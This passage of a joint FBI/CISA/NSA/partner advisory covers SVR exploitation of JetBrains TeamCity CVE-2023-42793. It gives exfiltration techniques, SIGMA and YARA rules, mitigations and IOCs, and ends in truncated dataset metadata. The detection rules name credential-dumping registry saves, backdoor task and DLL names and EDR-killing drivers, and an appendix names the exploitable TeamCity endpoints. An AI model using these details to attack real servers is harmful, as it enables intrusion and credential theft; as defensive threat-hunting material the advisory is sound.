SVR cyber actors may exfiltrate data,\nsuch as sensitive documents,\nthrough the use of automated\nprocessing after being gathered\nduring collection.\n\nExfiltration Over C2 Channel [T1041](https://attack.mitre.org/versions/v14/techniques/T1041/)\nSVR cyber actors may steal data\nby exfiltrating it over an existing C2\nchannel. Stolen data is encoded\ninto normal communications using\nthe same protocol as C2\ncommunications.\n\nExfiltration Over Web Service [T1567](https://attack.mitre.org/versions/v14/techniques/T1567/)\nSVR cyber actors use OneDrive\nand Dropbox to exfiltrate data to\ntheir C2 station.\n\n## INDICATORS OF COMPROMISE\n\n**_Note: Please refer to Appendix B for a list of IOCs._**\n\n## VICTIM TYPES\n\nAs a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC\nhave identified a few dozen compromised companies in the United States, Europe, Asia, and\nAustralia, and are aware of over a hundred compromised devices though we assess this list does not\nrepresent the full set of compromised organizations. Generally, the victim types do not fit into any sort\nof pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server,\nleading to the assessment that SVR’s exploitation of these victims’ networks was opportunistic in\nnature and not necessarily a targeted attack. Identified victims included: an energy trade association;\ncompanies that provide software for billing, medical devices, customer care, employee monitoring,\nfinancial management, marketing, sales, and video games; as well as hosting companies, tools\nmanufacturers, and small and large IT companies.\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Automated Exfiltration|T1020|SVR cyber actors may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during collection.|\n|Exfiltration Over C2 Channel|T1041|SVR cyber actors may steal data by exfiltrating it over an existing C2 channel. Stolen data is encoded into normal communications using the same protocol as C2 communications.|\n|Exfiltration Over Web Service|T1567|SVR cyber actors use OneDrive and Dropbox to exfiltrate data to their C2 station.|\n\n\n-----\n\nInternational Partnership\n\n\n## DETECTION METHODS\n\nThe following rules can be used to detect activity linked to adversary activity. These rules should\nserve as examples and adapt to each organization’s environment and telemetry.\n\n### SIGMA rules\n\nPresented SIGMA rules target identified operators’ behavior patterns and can be used for the threat\nhunting against collected logs.\n```\ntitle: Privilege information listing via whoami\ndescription: Detects whoami.exe execution and listing of privileges\nauthor: \nreferences: https://learn.microsoft.com/en-us/windows-server/administration/windowscommands/whoami\ndate: 2023/11/15\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n     - 'whoami.exe'\n    CommandLine|contains:\n     - 'priv'\n     - 'PRIV'\n  condition: selection\nfalsepositives: legitimate use by system administrator\ntitle: DC listing via nltest\ndescription: Detects nltest.exe execution and DC listing\nauthor: \nreferences:\ndate: 2023/11/15\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n     - 'nltest.exe'\n    CommandLine|re: '.*dclist\\:.*|.*DCLIST\\:.*|.*dsgetdc\\:.*|.*DSGETDC\\:.*'\n  condition: selection\nfalsepositives: legitimate use by system administrator\ntitle: DLL execution via WMI\ndescription: Detects DLL execution via WMI\nauthor: \nreferences:\ndate: 2023/11/15\n\n```\n\n-----\n\nInternational Partnership\n\n```\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n     - 'WMIC.exe'\n    CommandLine|contains|all:\n     - 'call'\n     - 'rundll32'\n  condition: selection\nfalsepositives: legitimate use by software or system administrator\ntitle: Process with connect and pass as args\ndescription: Process with connect and pass as args\nauthor:\nreferences:\ndate: 2023/11/15\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    CommandLine|contains|all:\n     - 'pass'\n     - 'connect'\n  condition: selection\nfalsepositives: legitimate use of rsockstun or software with exact same arguments\ntitle: Service or Drive enumeration via powershell\ndescription: Service or Drive enumeration via powershell \nauthor: \nreferences:\ndate: 2023/11/15\nlogsource:\n  category: ps_script\n  product: windows\ndetection:\n  selection_1:\n      ScriptBlockText|contains|all:\n      - 'Get-WmiObject'\n      - '-Class'\n      - 'Win32_Service'\n  selection_2:\n      ScriptBlockText|contains|all:\n      - 'Get-WindowsDriver'\n      - '-Online'\n      - '-All'\n  condition: selection_1 or selection_2\n\n```\n\n-----\n\nInternational Partnership\n\n```\nfalsepositives: legitimate use by system administrator\ntitle: Compressing files from temp to temp\ndescription: Compressing files from temp\\ to temp used by SVR to prepare data to be\nexfiltrated\nreferences:\nauthor: \ndate: 2023/11/15\nlogsource:\n  category: ps_script\n  product: windows\ndetection:\n  selection:\n    ScriptBlockText|re: '.*Compress\\-Archive.*Path.*Windows\\\\[Tt]{1}emp\\\\[19]{1}.*DestinationPath.*Windows\\\\[Tt]{1}emp\\\\.*'\n  condition: selection\ntitle: DLL names used by SVR for GraphicalProton backdoor\ndescription: Hunts for known SVR-specific DLL names.\nreferences:\nauthor: \ndate: 2023/11/15\nlogsource:\n  category: image_load\n  product: windows\ndetection:\n  selection:\n    ImageLoaded|endswith:\n     - 'AclNumsInvertHost.dll'\n     - 'ModeBitmapNumericAnimate.dll'\n     - 'UnregisterAncestorAppendAuto.dll'\n     - 'DeregisterSeekUsers.dll'\n     - 'ScrollbarHandleGet.dll'\n     - 'PerformanceCaptionApi.dll'\n     - 'WowIcmpRemoveReg.dll'\n     - 'BlendMonitorStringBuild.dll'\n     - 'HandleFrequencyAll.dll'\n     - 'HardSwapColor.dll'\n     - 'LengthInMemoryActivate.dll'\n     - 'ParametersNamesPopup.dll'\n     - 'ModeFolderSignMove.dll'\n     - 'ChildPaletteConnected.dll'\n     - 'AddressResourcesSpec.dll'\n  condition: selection\ntitle: Sensitive registry entries saved to file\ndescription: Sensitive registry entries saved to file\nauthor: \nreferences:\ndate: 2023/11/15\nlogsource:\n\n```\n\n-----\n\nInternational Partnership\n\n```\n  category: process_creation\n  product: windows\ndetection:\n  selection_base:\n    Image|endswith:\n     - 'reg.exe'\n    CommandLine|contains: 'save'\n    CommandLine|re: '.*HKLM\\\\SYSTEM.*|.*HKLM\\\\SECURITY.*|.*HKLM\\\\SAM.*'\n  selection_file:\n   CommandLine|re: '.*sy\\.sa.*|.*sam\\.sa.*|.*se\\.sa.*'\n  condition: selection_base and selection_file\ntitle: Scheduled tasks names used by SVR for GraphicalProton backdoor\ndescription: Hunts for known SVR-specific scheduled task names\nauthor: \nreferences: \ndate: 2023/11/15\nlogsource:\n  category: taskscheduler\n  product: windows\ndetection:\n  selection:\n    EventID:\n     - 4698\n     - 4699\n     - 4702\n    TaskName:\n     - '\\Microsoft\\Windows\\IISUpdateService'\n     - '\\Microsoft\\Windows\\WindowsDefenderService'\n     - '\\Microsoft\\Windows\\WindowsDefenderService2'\n     - '\\Microsoft\\DefenderService'\n     - '\\Microsoft\\Windows\\DefenderUPDService'\n     - '\\Microsoft\\Windows\\WiMSDFS'\n     - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck'\n     - '\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting'\n     - '\\Microsoft\\Windows\\Windows Defender\\Defender Update Service'\n     - '\\WindowUpdate'\n     - '\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting'\n     - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck'\n     - '\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask'\n     - '\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart'\n     - '\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Update'\n     - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'\n     - '\\Microsoft\\Windows\\ATPUpd'\n     - '\\Microsoft\\Windows\\Windows Defender\\Service Update'\n     - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check'\n     - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'\n     - '\\Defender'\n     - '\\defender'\n     - '\\\\Microsoft\\\\Windows\\\\IISUpdateService'\n     - '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService'\n\n```\n\n-----\n\nInternational Partnership\n\n```\n     - '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService2'\n     - '\\\\Microsoft\\\\DefenderService'\n     - '\\\\Microsoft\\\\Windows\\\\DefenderUPDService'\n     - '\\\\Microsoft\\\\Windows\\\\WiMSDFS'\n     - '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCkeck'\n     - '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\SubmitReporting'\n     - '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Defender Update Service'\n     - '\\\\WindowUpdate'\n     - '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\CheckReporting'\n     - '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCheck'\n     - '\\\\Microsoft\\\\Windows\\\\Speech\\\\SpeechModelInstallTask'\n     - '\\\\Microsoft\\\\Windows\\\\Windows Filtering Platform\\\\BfeOnServiceStart'\n     - '\\\\Microsoft\\\\Windows\\\\Data Integrity Scan\\Data Integrity Update'\n     - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'\n     - '\\\\Microsoft\\\\Windows\\\\ATPUpd'\n     - '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Service Update'\n     - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled Check'\n     - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'\n     - '\\\\Defender'\n     - '\\\\defender'\n  condition: selection\ntitle: Scheduled tasks names used by SVR for GraphicalProton backdoor\ndescription: Hunts for known SVR-specific scheduled task names\nauthor: \nreferences:\ndate: 2023/11/15\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n     - 'schtasks.exe'\n    CommandLine|contains:\n     - 'IISUpdateService'\n     - 'WindowsDefenderService'\n     - 'WindowsDefenderService2'\n     - 'DefenderService'\n     - 'DefenderUPDService'\n     - 'WiMSDFS'\n     - 'StartupAppTaskCkeck'\n     - 'SubmitReporting'\n     - 'Defender Update Service'\n     - 'WindowUpdate'\n     - 'CheckReporting'\n     - 'StartupAppTaskCheck'\n     - 'SpeechModelInstallTask'\n     - 'BfeOnServiceStart'\n     - 'Data Integrity Update'\n     - 'Scheduled AutoCheck'\n     - 'ATPUpd'\n\n```\n\n-----\n\nInternational Partnership\n\n```\n     - 'Service Update'\n     - 'Scheduled Check'\n     - 'Scheduled AutoCheck'\n     - 'Defender'\n     - 'defender'\n  selection_re:\n    Image|endswith:\n     - 'schtasks.exe'\n    CommandLine|re:\n     - '.*Defender\\sUpdate\\sService.*'\n     - '.*Data\\sIntegrity\\sUpdate.*'\n     - '.*Scheduled\\sAutoCheck.*'\n     - '.*Service\\sUpdate.*'\n     - '.*Scheduled\\sCheck.*'\n     - '.*Scheduled\\sAutoCheck.*'\n  condition: selection or selection_re\ntitle: Suspicious registry modifications\ndescription: Suspicious registry modifications\nauthor: \nreferences:\ndate: 2023/11/15\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    EventID: 4657\n    TargetObject|contains:\n     - 'CurrentControlSet\\\\Control\\\\Lsa\\\\DisableRestrictedAdmin'\n     - 'CurrentControlSet\\\\Control\\\\Lsa\\\\NoLMHash'\n  condition: selection\ntitle: Registry modification from cmd\ndescription: Registry modification from cmd\nauthor: \nreferences:\ndate: 2023/11/15\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n     - 'reg.exe'\n    CommandLine|contains|all:\n     - 'CurrentControlSet'\n     - 'Lsa'\n\n```\n\n-----\n\nInternational Partnership\n\n```\n    CommandLine|contains:\n     - 'DisableRestrictedAdmin'\n     - 'NoLMHash'\n  condition: selection\ntitle: Malicious Driver Load\ndescription: Detects the load of known malicious drivers via their names or hash.\nreferences:\n  - https://github.com/wavestone-cdt/EDRSandblast#edr-drivers-and-processes-detection\nauthor: \ndate: 2023/11/15\nlogsource:\n  category: driver_load\n  product: windows\ndetection:\n  selection_name:\n    ImageLoaded|endswith:\n      - 'RTCore64.sys'\n      - 'DBUtils_2_3.sys'\n  selection_hash:\n    Hashes|contains:\n      - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'\n      - '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'\n  condition: selection_name or selection_hash\n\n### YARA rules\n\n```\nThe following rule detects most known GraphicalProton variants.\n```\nrule APT29_GraphicalProton {\n  strings:\n    // C1 E9 1B                shr   ecx, 1Bh\n    // 48 8B 44 24 08             mov   rax, [rsp+30h+var_28]\n    // 8B 50 04                mov   edx, [rax+4]\n    // C1 E2 05                shl   edx, 5\n    // 09 D1                  or   ecx, edx\n    // 48 8B 44 24 08             mov   rax, [rsp+30h+var_28]\n    $op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 |\n08 | 10 | 0d | 07) 09 ?? 48 }\n    // 48 05 20 00 00 00            add   rax, 20h ; ' '\n    // 48 89 C1                mov   rcx, rax\n    // 48 8D 15 0A A6 0D 00          lea   rdx, unk_14011E546\n    // 41 B8 30 00 00 00            mov   r8d, 30h ; '0'\n    // E8 69 B5 FE FF             call  sub_14002F4B0\n    // 48 8B 44 24 30             mov   rax, [rsp+88h+var_58]\n    // 48 05 40 00 00 00            add   rax, 40h ; '@'\n    // 48 89 C1                mov   rcx, rax\n    // 48 8D 15 1B A6 0D 00          lea   rdx, unk_14011E577\n    // 41 B8 70 01 00 00            mov   r8d, 170h\n    // E8 49 B5 FE FF             call  sub_14002F4B0\n    // 48 8B 44 24 30             mov   rax, [rsp+88h+var_58]\n\n```\n\n-----\n\nInternational Partnership\n\n```\n    // 48 05 60 00 00 00            add   rax, 60h ; '`'\n    // 48 89 C1                mov   rcx, rax\n    // 48 8D 15 6C A7 0D 00          lea   rdx, unk_14011E6E8\n    // 41 B8 2F 00 00 00            mov   r8d, 2Fh ; '/'\n    // E8 29 B5 FE FF             call  sub_14002F4B0\n    // 48 8B 44 24 30             mov   rax, [rsp+88h+var_58]\n    // 48 05 80 00 00 00            add   rax, 80h\n    // 48 89 C1                mov   rcx, rax\n    // 48 8D 15 7C A7 0D 00          lea   rdx, unk_14011E718\n    // 41 B8 2F 00 00 00            mov   r8d, 2Fh ; '/'\n    // E8 09 B5 FE FF             call  sub_14002F4B0\n    // 48 8B 44 24 30             mov   rax, [rsp+88h+var_58]\n    // 48 05 A0 00 00 00            add   rax, 0A0h\n    $op_decrypt_config = {\n      48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n      48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n      48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n      48 05 80 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n      48 05 A0 00 00 00\n    }\n  condition:\n    all of them\n}\n\n```\n**Note: These rules are meant for threat hunting and have not been tested on a larger dataset.**\n\n## MITIGATIONS\n\nThe FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of\nthis campaign poses a threat to public safety and recommend organizations implement the mitigations\nbelow to improve organization’s cybersecurity posture. These mitigations align with the Cross-Sector\nCybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards\nand Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and\nNIST recommend all organizations implement. CISA and NIST based the CPGs on existing\ncybersecurity frameworks and guidance to protect against the most common and impactful threats,\n[tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals) for\nmore information on the CPGs, including additional recommended baseline protections.\n\n  - **Apply available patches** for CVE-2023-42793 issued by JetBrains TeamCity in midSeptember 2023, if not already completed.\n\n  - **Monitor the network for evidence of encoded commands and execution of network scanning**\ntools.\n\n  - **Ensure host-based anti-virus/endpoint monitoring solutions are enabled and set to alert if**\nmonitoring or reporting is disabled, or if communication is lost with a host agent for more than a\nreasonable amount of time.\n\n  - **[Require use of multi-factor authentication [CPG 1.3] for all services to the extent possible,](https://www.cisa.gov/resources-tools/resources/cpg-report)**\nparticularly for email, virtual private networks, and accounts that access critical systems.\n\n\n-----\n\nInternational Partnership\n\n\n\n    - Organizations should adopt multi-factor authentication (MFA) as an additional layer of\nsecurity for all users with access to sensitive data. Enabling MFA significantly reduces the\nrisk of unauthorized access, even if passwords are compromised.\n\n  - **Keep all operating systems, software, and firmware up to date.** Immediately configure\nnewly-added systems to the network, including those used for testing or development work, to\nfollow the organization’s security baseline and incorporate into enterprise monitoring tools.\n\n  - **Audit log files to identify attempts to access privileged certificates and creation of fake identity**\nproviders.\n\n  - **Deploy software to identify suspicious behavior on systems.**\n\n  - **Deploy endpoint protection systems with the ability to monitor for behavioral indicators of**\ncompromise.\n\n  - **Use available public resources to identify credential abuse with cloud environments.**\n\n  - **Configure authentication mechanisms to confirm certain user activities on systems, including**\nregistering new devices.\n\n## VALIDATE SECURITY CONTROLS\n\nIn addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend\nexercising, testing, and validating your organization's security program against the threat behaviors\nmapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW,\nCERT Polska, and NCSC recommend testing your existing security controls inventory to assess how\nthey perform against the ATT&CK techniques described in this advisory.\n\nTo get started:\n\n1. Select an ATT&CK technique described in this advisory (see previous tables).\n2. Align your security technologies against the technique.\n3. Test your technologies against the technique.\n4. Analyze your detection and prevention technologies’ performance.\n5. Repeat the process for all security technologies to obtain a set of comprehensive performance\ndata.\n6. Tune your security program, including people, processes, and technologies, based on the\ndata generated by this process.\n\nFBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security\nprogram, at scale, in a production environment to ensure optimal performance against the MITRE\nATT&CK techniques identified in this advisory.\n\n## REFERENCES\n\n  - FBI, DHS, CISA, Joint Cyber Security Advisory, [Russian Foreign Intelligence Service (SVR)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-116a)\n[Cyber Operations: Trends and Best Practices for Network Defenders](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-116a)\n\n  - NSA, CISA, FBI, Joint Cyber Security Advisory, [Russian SVR Targets U.S. and Allied](https://media.defense.gov/2021/Apr/15/2002621240/-1/-1/0/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF)\n[Networks](https://media.defense.gov/2021/Apr/15/2002621240/-1/-1/0/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF)\n\n  - [CISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365](https://www.cisa.gov/news-events/news/remediating-networks-affected-solarwinds-and-active-directorym365-compromise)\n[Compromise](https://www.cisa.gov/news-events/news/remediating-networks-affected-solarwinds-and-active-directorym365-compromise)\n\n\n-----\n\nInternational Partnership\n\n\n\n  - [CISA, Alert (AA21-008A), Detecting Post-Compromise Threat Activity in Microsoft Cloud](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a)\n[Environments](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a)\n\n  - [CISA, Alert (AA20-352A), Advanced Persistent Threat Compromise of Government Agencies,](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a)\n[Critical Infrastructure, and Private Sector Organizations](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a)\n\n  - [CISA, CISA Insights, What Every Leader Needs to Know About the Ongoing APT Cyber](https://www.cisa.gov/sites/default/files/publications/CISA%20Insights%20-%20What%20Every%20Leader%20Needs%20to%20Know%20About%20the%20Ongoing%20APT%20Cyber%20Activity%20-%20FINAL_508.pdf)\nActivity\n\n  - [FBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S.](https://www.cisa.gov/sites/default/files/publications/AA20-336A-APT_Actors_Targeting_US_ThinkTanks.pdf)\n[Think Tanks](https://www.cisa.gov/sites/default/files/publications/AA20-336A-APT_Actors_Targeting_US_ThinkTanks.pdf)\n\n  - CISA, [Malicious Activity Targeting COVID-19 Research, Vaccine Development](https://www.cisa.gov/news-events/alerts/2020/07/16/malicious-activity-targeting-covid-19-research-vaccine-development)\n\n  - [NCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID-19 Vaccine Development](https://media.defense.gov/2020/Jul/16/2002457639/-1/-1/0/NCSC_APT29_ADVISORY-QUAD-OFFICIAL-20200709-1810.PDF)\n\nThe information in this report is being provided “as is” for informational purposes only. FBI, CISA,\nNSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or\nservice, including any entities, products, or services linked within this document. Any reference to\nspecific commercial entities, products, processes, or services by service mark, trademark,\nmanufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring\nby FBI, CISA, NSA, SKW, CERT Polska, and NCSC.\n\n## VERSION HISTORY\n\nDecember 12, 2023: Initial version.\n\n\n-----\n\nInternational Partnership\n\n\n## APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793\n\nOn a Windows system, the log file `C:\\TeamCity\\logs\\teamcity-server.log` will contain a log\nmessage when an attacker modified the internal.properties file. There will also be a log message\nfor every process created via the `/app/rest/debug/processes` endpoint. In addition to showing the\ncommand line used, the user ID of the user account whose authentication token was used during the\nattack is also shown. For example:\n```\n[2023-09-26 11:53:46,970]  INFO - ntrollers.FileBrowseController - File\nedited: C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties by\nuser with id=1\n[2023-09-26 11:53:46,970]  INFO - s.buildServer.ACTIVITIES.AUDIT server_file_change: File\nC:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties was modified\nby \"user with id=1\"\n[2023-09-26 11:53:58,227]  INFO - tbrains.buildServer.ACTIVITIES External process is launched by user user with id=1. Command line: cmd.exe\n\"/c whoami\"\n\n```\nAn attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity\nlogs individual HTTP requests, but if TeamCity is [configured to sit behind a HTTP proxy, the HTTP](https://www.jetbrains.com/help/teamcity/configuring-proxy-server.html)\nproxy may have suitable logs showing the following target endpoints being accessed:\n\n  - `/app/rest/users/id:1/tokens/RPC2 – This endpoint is required to exploit the vulnerability.`\n\n  - `/app/rest/users – This endpoint is only required if the attacker wishes to create an arbitrary`\nuser.\n\n  - `/app/rest/debug/processes` – This endpoint is only required if the attacker wishes to create\nan arbitrary process.\n\n**Note: The user ID value may be higher than 1.**\n\n\n-----\n\nInternational Partnership\n\n\n## APPENDIX B – IOCS\n\n#### File IoCs\n\nGraphicalProton backdoor:\n\n- 01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732\n\n- 34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E\n\n- 620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869\n\n- 773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13\n\n- 7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53\n\n- 8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7\n\n- 971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC\n\n- CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF\n\n- CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43\n\n- EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E\n\n- F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB\n\n- C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4\n\n- 4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166\n\nGraphicalProton HTTPS backdoor:\n\n- 18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93\n\n- 19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641\n\n- 1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8\n\n- 219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67\n\n- 92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6\n\n- B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7\n\n- C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD\n\n- C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0\n\n- C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3\n\n- F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69\n\nBackdoored vcperf:\n\n- D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443\n\nBackdoored Zabbix installation archive:\n\n- 4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F\n\nBackdoored Webroot AV installation archive:\n\n- 950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4\n\nModified rsockstun\n\n- CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF\n\n#### Network IoCs\n\n\n-----\n\nInternational Partnership\n\n\n#### Tunnel Endpoints\n\n- 65.20.97[.]203\n\n- 65.21.51[.]58\n\n#### Exploitation Server\n\n- 103.76.128[.]34\n\n#### GraphicalProton HTTPS C2 URL:\n\nhxxps://matclick[.]com/wp-query[.]php\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/fd039qqm7o9tl7yrbda7f3uevumj2twu"
    ],
    "report_names": [
        "CISA_aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally_0(12-13-2023)"
    ],
    "threat_actors": [
        {
            "id": "b43e5ea9-d8c8-4efa-b5bf-f1efb37174ba",
            "created_at": "2022-10-25T16:07:24.36191Z",
            "updated_at": "2025-03-27T02:02:10.1909Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "Dark Halo",
                "Nobelium",
                "SolarStorm",
                "StellarParticle",
                "UNC2452"
            ],
            "source_name": "ETDA:UNC2452",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "70872c3a-e788-4b55-a7d6-b2df52001ad0",
            "created_at": "2023-01-06T13:46:39.18401Z",
            "updated_at": "2025-03-27T02:00:03.01553Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "DarkHalo",
                "StellarParticle",
                "NOBELIUM",
                "Solar Phoenix",
                "Midnight Blizzard"
            ],
            "source_name": "MISPGALAXY:UNC2452",
            "tools": [
                "SNOWYAMBER",
                "HALFRIG",
                "QUARTERRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1d3f9dec-b033-48a5-8b1e-f67a29429e89",
            "created_at": "2022-10-25T15:50:23.739197Z",
            "updated_at": "2025-03-27T02:00:55.536417Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "UNC2452",
                "NOBELIUM",
                "StellarParticle",
                "Dark Halo"
            ],
            "source_name": "MITRE:UNC2452",
            "tools": [
                "Sibot",
                "Mimikatz",
                "Cobalt Strike",
                "AdFind",
                "GoldMax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
